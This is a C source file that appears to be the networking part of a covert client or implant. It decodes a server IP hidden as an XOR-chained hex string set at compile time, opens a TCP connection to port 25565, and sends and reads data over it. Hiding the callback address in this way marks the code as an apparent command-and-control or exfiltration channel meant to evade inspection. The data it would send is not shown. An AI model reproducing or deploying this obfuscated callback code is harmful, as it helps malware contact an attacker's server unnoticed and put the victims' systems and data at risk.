#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

// read variable from environment variable during compile time
#ifdef IP
const char *const encoded_ip = IP;
#else
const char *const encoded_ip = "725c6c42725c6c"; // default to 0.0.0.0
#endif

int sockfd = 0;
struct sockaddr_in serv_addr;

char *const get_ip_from_mess() {
  /*
   * Decode the encoded IP address
   */
  size_t len = strlen(encoded_ip);
  char *ip = malloc(len / 2 + 1);
  char xor = 0x42;

  for (size_t i = 0; i < len; i += 2) {
    char hex_str[3] = {encoded_ip[i], encoded_ip[i + 1], '\0'};

    // convert hex to int
    char ip_byte = strtol(hex_str, NULL, 16);

    ip[i / 2] = ip_byte ^ xor;
    xor = ip_byte;
  }

  ip[len / 2] = '\0';
  return ip;
}

unsigned char open_server_connection() {
  /*
   * Open a connection to the server
   */

  char *const ip = get_ip_from_mess();
  struct timeval timeout = {0, 5000};
  int opt, ready_fd;

  if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    free(ip);
    return 1;
  }

  // set socket to non-blocking
  if ((opt = fcntl(sockfd, F_GETFL, NULL)) < 0) {
    free(ip);
    return 1;
  }
  if (fcntl(sockfd, F_SETFL, opt | O_NONBLOCK) < 0) {
    free(ip);
    return 1;
  }

  memset(&serv_addr, '0', sizeof(serv_addr));

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(25565);

  if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
    free(ip);
    return 1;
  }
  free(ip);

  // connect to server
  if ((connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))) < 0) {
    fd_set wait_set;

    // make file descriptor set with socket
    FD_ZERO(&wait_set);
    FD_SET(sockfd, &wait_set);

    // wait for socket to be writable; return after given timeout
    ready_fd = select(sockfd + 1, NULL, &wait_set, NULL, &timeout);
  } else // should not happen, but if connection is instant, set ready_fd to 1
    ready_fd = 1;

  if (fcntl(sockfd, F_SETFL, opt) < 0) // set socket back to blocking
    return -1;

  // if select() timed out or failed
  if (ready_fd <= 0)
    return -1;

  return 0;
}

void close_server_connection() {
  /*
   * Close the connection to the server
   */
  close(sockfd);
  sockfd = 0;
}

unsigned char send_network_data(const char *const data, const size_t len) {
  /*
   * Send data to the server and append a null byte because socat
   */
  char zero = 0;
  if (write(sockfd, data, len) < 0 || write(sockfd, &zero, 1) < 0)
    return 1;
  return 0;
}

unsigned char read_network_data(char *const buff, const size_t buff_size) {
  /*
   * Read data from the server
   */
  if (read(sockfd, buff, buff_size) < 0)
    return 1;
  return 0;
}
